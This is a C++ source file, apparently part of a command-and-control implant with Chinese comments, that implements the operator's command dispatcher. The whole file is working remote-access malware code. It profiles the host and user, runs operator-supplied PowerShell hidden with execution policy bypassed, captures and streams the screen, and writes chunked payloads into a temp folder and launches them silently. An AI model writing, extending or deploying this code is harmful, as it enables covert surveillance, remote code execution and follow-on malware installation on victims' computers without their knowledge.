// cmd_dispatch.cpp — 命令分发中心实现：SYS_INFO（系统信息）与 EXEC_PS（PowerShell 执行）
#include "cmd_dispatch.h"

#include "protocol.h"
#include "screen_spy.h"
#include "screen_stream.h"

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>

#include <cstdio>
#include <cstring>
#include <set>
#include <sstream>
#include <string>
#include <thread>

#include <dxgi.h>
#include <wrl/client.h>


namespace c2
{

    namespace
    {

        // RtlGetVersion 动态声明（避免依赖新 SDK 头）
        typedef struct
        {
            ULONG dwOSVersionInfoSize;
            ULONG dwMajorVersion;
            ULONG dwMinorVersion;
            ULONG dwBuildNumber;
            ULONG dwPlatformId;
            WCHAR szCSDVersion[128];
        } OsVersionInfoW;

        typedef LONG(WINAPI* RtlGetVersionFn)(OsVersionInfoW*);

        using Microsoft::WRL::ComPtr;

        std::string WcharToUtf8(const wchar_t* w)
        {
            if (!w)
                return "";
            int n = WideCharToMultiByte(CP_UTF8, 0, w, -1, nullptr, 0, nullptr, nullptr);
            if (n <= 1)
                return "";
            std::string s((size_t)(n - 1), 0);
            WideCharToMultiByte(CP_UTF8, 0, w, -1, &s[0], n, nullptr, nullptr);
            return s;
        }

    } // namespace

    // 枚举显示适配器与显示器：输出 "显卡 显存MB 显示器名 宽*高 ..."
    std::string collect_graphics_info()
    {
        struct LuidLess {
            bool operator()(const LUID& a, const LUID& b) const {
                unsigned long long ka = ((unsigned long long)a.HighPart << 32) | a.LowPart;
                unsigned long long kb = ((unsigned long long)b.HighPart << 32) | b.LowPart;
                return ka < kb;
            }
        };
        std::ostringstream info;
        std::set<LUID, LuidLess> seenAdapters;
        ComPtr<IDXGIFactory1> factory;
        if (FAILED(CreateDXGIFactory1(IID_PPV_ARGS(&factory))))
            return "";

        const UINT maxAdapters = 3;
        for (UINT ai = 0; ai < maxAdapters; ++ai)
        {
            ComPtr<IDXGIAdapter1> adapter;
            HRESULT hr = factory->EnumAdapters1(ai, &adapter);
            if (hr == DXGI_ERROR_NOT_FOUND)
                break;
            if (FAILED(hr) || !adapter)
                continue;

            DXGI_ADAPTER_DESC adesc{};
            if (FAILED(adapter->GetDesc(&adesc)))
                continue;
            if (!seenAdapters.insert(adesc.AdapterLuid).second)
                continue;

            info << WcharToUtf8(adesc.Description) << ' '
                 << (adesc.DedicatedVideoMemory >> 20) << "MB ";

            for (UINT oi = 0;; ++oi)
            {
                ComPtr<IDXGIOutput> output;
                hr = adapter->EnumOutputs(oi, &output);
                if (hr == DXGI_ERROR_NOT_FOUND)
                    break;
                if (FAILED(hr) || !output)
                    continue;

                DXGI_OUTPUT_DESC odesc{};
                if (FAILED(output->GetDesc(&odesc)))
                    continue;
                int w = odesc.DesktopCoordinates.right - odesc.DesktopCoordinates.left;
                int h = odesc.DesktopCoordinates.bottom - odesc.DesktopCoordinates.top;
                info << WcharToUtf8(odesc.DeviceName) << ' ' << w << '*' << h << ' ';
            }
        }
        return info.str();
    }


    std::string collect_sysinfo()
    {
        std::string out;
        char buf[256];

        // OS 版本（RtlGetVersion，GetVersionEx 已废弃）
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll)
        {
            auto fn = (RtlGetVersionFn)GetProcAddress(ntdll, "RtlGetVersion");
            if (fn)
            {
                OsVersionInfoW vi{};
                vi.dwOSVersionInfoSize = sizeof(vi);
                if (fn(&vi) == 0)
                {
                    snprintf(buf, sizeof(buf), "OS: Windows %lu.%lu (build %lu)\r\n",
                        vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
                    out += buf;
                }
            }
        }

        // CPU
        SYSTEM_INFO si{};
        GetSystemInfo(&si);
        snprintf(buf, sizeof(buf), "CPU: %u logical processors\r\n", si.dwNumberOfProcessors);
        out += buf;

        // 内存
        MEMORYSTATUSEX ms{};
        ms.dwLength = sizeof(ms);
        if (GlobalMemoryStatusEx(&ms))
        {
            snprintf(buf, sizeof(buf), "MEM: total %.0f MB, free %.0f MB\r\n",
                ms.ullTotalPhys / 1048576.0, ms.ullAvailPhys / 1048576.0);
            out += buf;
        }

        // 磁盘 C:
        ULARGE_INTEGER total{}, free_{};
        if (GetDiskFreeSpaceExW(L"C:\\", nullptr, &total, &free_))
        {
            snprintf(buf, sizeof(buf), "DISK C:: total %.0f GB, free %.0f GB\r\n",
                total.QuadPart / 1073741824.0, free_.QuadPart / 1073741824.0);
            out += buf;
        }

        // 主机名 / 用户名
        char host[256] = { 0 };
        DWORD hn = sizeof(host);
        if (GetComputerNameA(host, &hn))
            out += "HOST: " + std::string(host) + "\r\n";
        char user[256] = { 0 };
        DWORD un = sizeof(user);
        if (GetUserNameA(user, &un))
            out += "USER: " + std::string(user) + "\r\n";

        // 显示器/显卡信息（ctl 可据此了解远程屏幕分辨率）
        std::string gfx = collect_graphics_info();
        if (!gfx.empty())
            out += "DISPLAY: " + gfx + "\r\n";

        return out;
    }

    std::string exec_powershell(const std::string& command, uint8_t& status) {
        status = kStatusOK;

        // ---------- 1. UTF-8 → UTF-16 命令行转换 ----------
        int wlen = MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, nullptr, 0);
        if (wlen <= 0) {
            status = kStatusBadParam;
            return "invalid command encoding";
        }
        std::wstring wcmd(wlen, 0);
        MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, &wcmd[0], wlen);
        std::wstring cmdline =
            L"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"$OutputEncoding = [System.Text.Encoding]::UTF8; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; " +
            wcmd + L"\"";

        // ---------- 2. 创建管道，写端可继承 ----------
        SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
        HANDLE readPipe = nullptr, writePipe = nullptr;
        if (!CreatePipe(&readPipe, &writePipe, &sa, 0)) {
            status = kStatusBadParam;
            return "CreatePipe failed";
        }
        // 确保写句柄可以被子进程继承
        SetHandleInformation(writePipe, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

        // ---------- 3. 设置 STARTUPINFO ----------
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = writePipe;
        si.hStdError = writePipe;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

        PROCESS_INFORMATION pi{};

        // ---------- 4. 创建 Job Object（用于进程树管理）----------
        HANDLE hJob = nullptr;
        bool hasJob = false;
        hJob = CreateJobObjectW(nullptr, nullptr);
        if (hJob) {
            // 设置 Job 限制：关闭 Job 句柄时自动终止所有关联进程
            JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = {};
            jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
            if (SetInformationJobObject(hJob, JobObjectExtendedLimitInformation,
                &jeli, sizeof(jeli))) {
                hasJob = true;
            }
            else {
                // 设置失败则关闭 Job，后续降级为原始行为
                CloseHandle(hJob);
                hJob = nullptr;
            }
        }

        // ---------- 5. 创建进程（挂起，以便分配 Job）----------
        BOOL ok = CreateProcessW(nullptr, &cmdline[0], nullptr, nullptr, TRUE,
            CREATE_NO_WINDOW | CREATE_SUSPENDED, nullptr, nullptr, &si, &pi);
        CloseHandle(writePipe);
        if (!ok) {
            CloseHandle(readPipe);
            if (hJob) CloseHandle(hJob);
            status = kStatusUnknownCmd;
            return "CreateProcess failed";
        }

        if (hasJob) {
            if (!AssignProcessToJobObject(hJob, pi.hProcess)) {
                CloseHandle(hJob);
                hJob = nullptr;
                hasJob = false;
            }
        }
        ResumeThread(pi.hThread);

        std::string output;
        std::thread reader([&]() {
            char buf[4096];
            DWORD n = 0;
            while (ReadFile(readPipe, buf, sizeof(buf), &n, nullptr) && n > 0)
                output.append(buf, n);
            });

        // ---------- 7. 等待进程结束 ----------
        DWORD wait = WaitForSingleObject(pi.hProcess, 120000);
        if (wait == WAIT_TIMEOUT) {
            if (hasJob && hJob) TerminateJobObject(hJob, 1);
            else TerminateProcess(pi.hProcess, 1);
        }
        else {
            if (hasJob && hJob) TerminateJobObject(hJob, 1); // 强制清理残留子进程
        }

        // 确保所有进程被终止，管道写端关闭
        if (hasJob && hJob) {
            Sleep(100);
            CloseHandle(hJob);
            hJob = nullptr;
        }

        reader.join();

        CloseHandle(readPipe);
        CloseHandle(pi.hThread);
        DWORD code = 0;
        GetExitCodeProcess(pi.hProcess, &code);
        CloseHandle(pi.hProcess);

        char tail[64];
        snprintf(tail, sizeof(tail), "\r\n[exit code: %lu]", code);
        return output + tail;
    }

    // ---------- 截屏（0x1001）：GDI 抓一帧 → WIC JPEG ----------

    bool capture_screenshot_jpeg(std::vector<uint8_t>& out, uint8_t& status)
    {
        status = kStatusOK;
        ScreenSpy* spy = ScreenSpy::create(32, false, -1, -1, -1, -1, 1.0f);
        if (!spy)
        {
            status = kStatusPluginErrBase;
            return false;
        }
        bool ok = spy->grab() &&
            jpeg_encode_bgra(spy->width(), spy->height(), spy->stride(),
                spy->pixels(), 75, out);
        delete spy;
        if (!ok || out.empty())
        {
            status = kStatusPluginErrBase;
            return false;
        }
        return true;
    }

    // ---------- payload 分块上传与执行（0x3009，协议 §10）----------

    uint16_t rd_u16(const uint8_t* p) { return (uint16_t)(p[0] | ((uint16_t)p[1] << 8)); }

    uint32_t rd_u32(const uint8_t* p)
    {
        return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
            ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
    }

    uint64_t rd_u64(const uint8_t* p)
    {
        uint64_t v = 0;
        for (int i = 7; i >= 0; --i)
            v = (v << 8) | p[i];
        return v;
    }

    // 文件名白名单：仅允许单段文件名，拒绝路径分隔符与路径穿越
    bool valid_payload_name(const std::string& n)
    {
        if (n.empty() || n.size() > kPayloadMaxNameLen)
            return false;
        if (n == "." || n == "..")
            return false;
        for (size_t i = 0; i < n.size(); ++i)
        {
            unsigned char c = (unsigned char)n[i];
            if (c == '\\' || c == '/' || c == ':' || c < 0x20)
                return false;
        }
        return true;
    }

    std::wstring utf8_to_wide(const std::string& s)
    {
        if (s.empty())
            return std::wstring();
        int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
        if (n <= 0)
            return std::wstring();
        std::wstring w((size_t)n, 0);
        MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
        return w;
    }

    // payload 落盘目录（%TEMP% 下的 c2_payload）
    std::wstring payload_dir()
    {
        wchar_t tmp[MAX_PATH] = { 0 };
        DWORD n = GetTempPathW(MAX_PATH, tmp);
        std::wstring d = (n > 0 && n < MAX_PATH) ? std::wstring(tmp, (size_t)n)
            : std::wstring(L".\\");
        if (!d.empty() && d[d.size() - 1] != L'\\')
            d += L'\\';
        d += L"c2_payload\\";
        return d;
    }

    // 写入一块；末块（flags.bit0=1）写完后经 CreateProcess 启动（不等待退出）
    std::string upload_and_maybe_exec(const uint8_t* payload, size_t len, uint8_t& status)
    {
        status = kStatusOK;
        // 头固定部分：name_len(2)+args_len(2)+offset(8)+flags(1)+data_len(4) = 17
        if (len < 17)
        {
            status = kStatusBadParam;
            return "payload too short";
        }
        size_t off = 0;
        uint16_t name_len = rd_u16(payload + off); off += 2;
        if (name_len == 0 || len < off + (size_t)name_len + 2)
        {
            status = kStatusBadParam;
            return "bad name length";
        }
        std::string name((const char*)payload + off, name_len); off += name_len;

        uint16_t args_len = rd_u16(payload + off); off += 2;
        if (len < off + (size_t)args_len + 8 + 1 + 4)
        {
            status = kStatusBadParam;
            return "truncated header";
        }
        std::string args((const char*)payload + off, args_len); off += args_len;

        uint64_t offset = rd_u64(payload + off); off += 8;
        uint8_t flags = payload[off++];
        uint32_t data_len = rd_u32(payload + off); off += 4;
        if (data_len > kPayloadChunkSize || len < off + (size_t)data_len)
        {
            status = kStatusBadParam;
            return "bad chunk size";
        }
        if (!valid_payload_name(name))
        {
            status = kStatusBadParam;
            return "invalid payload name";
        }
        if (offset + data_len > (uint64_t)kPayloadMaxTotal)
        {
            status = kStatusBadParam;
            return "payload exceeds size limit";
        }

        std::wstring dir = payload_dir();
        CreateDirectoryW(dir.c_str(), nullptr);  // 已存在则失败，忽略
        std::wstring wname = utf8_to_wide(name);
        if (wname.empty())
        {
            status = kStatusBadParam;
            return "bad payload name encoding";
        }
        std::wstring path = dir + wname;

        HANDLE f = CreateFileW(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ, nullptr,
            offset == 0 ? CREATE_ALWAYS : OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL, nullptr);
        if (f == INVALID_HANDLE_VALUE)
        {
            status = kStatusNoPermission;
            return "open payload file failed (err=" + std::to_string(GetLastError()) + ")";
        }
        LARGE_INTEGER li;
        li.QuadPart = (LONGLONG)offset;
        SetFilePointerEx(f, li, nullptr, FILE_BEGIN);
        DWORD written = 0;
        BOOL wok = (data_len == 0) ? TRUE
            : WriteFile(f, payload + off, data_len, &written, nullptr);
        LARGE_INTEGER total;
        total.QuadPart = 0;
        GetFileSizeEx(f, &total);
        CloseHandle(f);
        if (!wok || written != data_len)
        {
            status = kStatusPluginErrBase;
            return "write payload failed (err=" + std::to_string(GetLastError()) + ")";
        }
        if (total.QuadPart > (LONGLONG)kPayloadMaxTotal)
        {
            status = kStatusBadParam;
            return "payload exceeds size limit";
        }

        std::string utf8path = WcharToUtf8(path.c_str());
        std::string progress = "stored " + std::to_string(data_len) + " bytes at offset " +
            std::to_string(offset) + " -> " + utf8path;

        if (!(flags & kPayloadFlagLast))
            return progress;  // 非末块：只确认写入

        // 末块：启动 payload（不等待退出，不继承句柄）
        std::wstring cmdline = L"\"" + path + L"\"";
        if (!args.empty())
        {
            std::wstring wargs = utf8_to_wide(args);
            if (!wargs.empty())
            {
                cmdline += L" ";
                cmdline += wargs;
            }
        }
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};
        BOOL ok = CreateProcessW(nullptr, &cmdline[0], nullptr, nullptr, FALSE,
            CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
            nullptr, dir.c_str(), &si, &pi);
        if (!ok)
        {
            status = kStatusPluginErrBase;
            return progress + "\r\nCreateProcess failed (err=" +
                std::to_string(GetLastError()) + ")";
        }
        DWORD pid = pi.dwProcessId;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return progress + "\r\nexecuted pid=" + std::to_string(pid) +
            " size=" + std::to_string((long long)total.QuadPart);
    }

    bool handle_command(uint16_t cmd, const uint8_t* payload, size_t len,
        std::vector<uint8_t>& response, uint8_t& status)
    {
        status = kStatusOK;
        std::string text;
        switch (cmd)
        {
        case kCmdSysInfo:
            text = collect_sysinfo();
            break;
        case kCmdExecPs:
            if (len == 0)
            {
                status = kStatusBadParam;
                return true;
            }
            text = exec_powershell(std::string((const char*)payload, len), status);
            break;
        case kCmdScreenshot:
        {
            // 响应为 JPEG 原始字节（二进制，不经文本转换）
            std::vector<uint8_t> jpeg;
            if (!capture_screenshot_jpeg(jpeg, status))
            {
                text = "screenshot failed";
                break;
            }
            response = std::move(jpeg);
            return true;
        }
        case kCmdPayload:
            // 分块写入 %TEMP%\c2_payload\；末块写完后启动并返回 pid
            text = upload_and_maybe_exec(payload, len, status);
            break;
        case kCmdScreenStream:
        {
            // payload: 控制(1B: 0=停/1=开) + fps(1B) + quality(1B) + scale(1B, 百分数)
            if (len < 1)
            {
                status = kStatusBadParam;
                return true;
            }
            uint8_t control = payload[0];
            int fps = len > 1 ? payload[1] : 25;
            int quality = len > 2 ? payload[2] : 70;
            float scale = len > 3 && payload[3] > 0 ? (float)payload[3] / 100.0f : 1.0f;
            if (control != 0)
                text = start_screen_stream(fps, quality, scale)
                           ? "screen stream started"
                           : "screen stream already running";
            else
            {
                stop_screen_stream();
                text = "screen stream stopped";
            }
            break;
        }
        default:
            status = kStatusUnknownCmd;
            return false; // 未处理：调用方不回 CMD_RESULT
        }
        response.assign(text.begin(), text.end());
        return true;
    }

} // namespace c2
